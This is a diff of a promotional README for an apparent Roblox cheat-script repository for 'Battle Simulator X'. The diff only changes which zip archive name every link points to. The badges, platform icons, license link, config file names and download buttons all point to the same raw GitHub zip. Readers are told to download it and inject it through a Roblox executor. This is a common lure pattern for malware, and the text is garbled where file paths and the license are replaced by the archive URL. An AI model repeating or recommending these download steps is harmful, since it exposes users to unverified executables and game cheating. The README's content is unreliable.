@@ -2,9 +2,9 @@
 
 Welcome to **Battle Simulator X Roblox Script** – the definitive repository for creative script solutions and advanced automation tailored for *Battle Simulator X* on Roblox. Level up your gameplay experience and unlock a new spectrum of customization, performance, and control with this collection of meticulously engineered scripts.
 
-[![Stars](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)]()
-[![Issues](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)]()
-[![License](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)
+[![Stars](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)]()
+[![Issues](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)]()
+[![License](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)
 
 ---
 
@@ -14,11 +14,11 @@ Curious about which systems can run Battle Simulator X scripts from this reposit
 
 | Platform    | Supported | Icon                                   |
 |-------------|:---------:|----------------------------------------|
-| Windows 10+ |    ✅     | ![Windows](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip+-blue?logo=windows)  |
-| macOS 11+   |    ✅     | ![macOS](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip+-lightgrey?logo=apple)   |
-| Linux       |    ✅     | ![Linux](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)|
-| Roblox Mobile | 🚧     | ![Mobile](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)|
-| Virtual Machines | ✅  | ![VM](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)    |
+| Windows 10+ |    ✅     | ![Windows](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip+-blue?logo=windows)  |
+| macOS 11+   |    ✅     | ![macOS](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip+-lightgrey?logo=apple)   |
+| Linux       |    ✅     | ![Linux](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)|
+| Roblox Mobile | 🚧     | ![Mobile](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)|
+| Virtual Machines | ✅  | ![VM](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)    |
 
 ---
 
@@ -54,7 +54,7 @@ Go beyond ordinary scripts—*Battle Simulator X Roblox Script* is empowered by 
 - **Rate-Limited and Secure:** All API communications follow best practices to ensure your experience is seamless and safe.
 
 **API Credentials Setup**  
-To enable advanced API features, add your API keys to the `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip` or `env` files. Documentation can be found in `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip`.
+To enable advanced API features, add your API keys to the `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip` or `env` files. Documentation can be found in `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip`.
 
 ---
 
@@ -72,14 +72,14 @@ To enable advanced API features, add your API keys to the `https://raw.githubuse
 ### Step-by-Step Instructions
 
 1. **Download the Latest Release:**  
-    [![Download](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)  
+    [![Download](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)  
     *(Click above to access the most recent Battle Simulator X Roblox Script package — delivered fresh from the forge.)*
 
 2. **Extract & Install:**  
-    Unzip the package and import the `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip` file into your Roblox executor or supported Lua environment.
+    Unzip the package and import the `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip` file into your Roblox executor or supported Lua environment.
 
 3. **Configure:**  
-    Open `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip` with your favorite text editor. Set API keys, tweak settings for performance, and select your preferred language.
+    Open `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip` with your favorite text editor. Set API keys, tweak settings for performance, and select your preferred language.
 
 4. **Launch & Enjoy:**  
     Inject the script while inside a *Battle Simulator X* session. An interface overlay will appear with further options and live statistics.
@@ -93,7 +93,7 @@ To enable advanced API features, add your API keys to the `https://raw.githubuse
 
 ## 🚀 Contributing
 
-We welcome coders, designers, and strategists! Please visit `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip` for submission guidelines and open roles. Every contributor is a cornerstone of this evolving legend.
+We welcome coders, designers, and strategists! Please visit `https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip` for submission guidelines and open roles. Every contributor is a cornerstone of this evolving legend.
 
 ---
 
@@ -107,14 +107,14 @@ This repository is **intended strictly for educational and entertainment purpose
 
 This project operates under the MIT License. You're empowered to use, adapt, and share the code—creativity and curiosity are encouraged!
 
-For full license terms, see: [MIT License](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)
+For full license terms, see: [MIT License](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)
 
 ---
 
 ## 🎯 Download the Ultimate Script Suite
 
 Ready to transform your Battle Simulator X journey?  
-[![Download](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/battle-sim-x-roblox-enhancer-v1.0.zip)  
+[![Download](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)](https://raw.githubusercontent.com/DerricB-front/battle-sim-x-roblox-enhancer/branch/pledgeor/enhancer_sim_x_battle_roblox_v3.0-alpha.2.zip)  
 *(Grab your unique scripting toolkit and step into the future of Roblox automation!)*
 
 ---
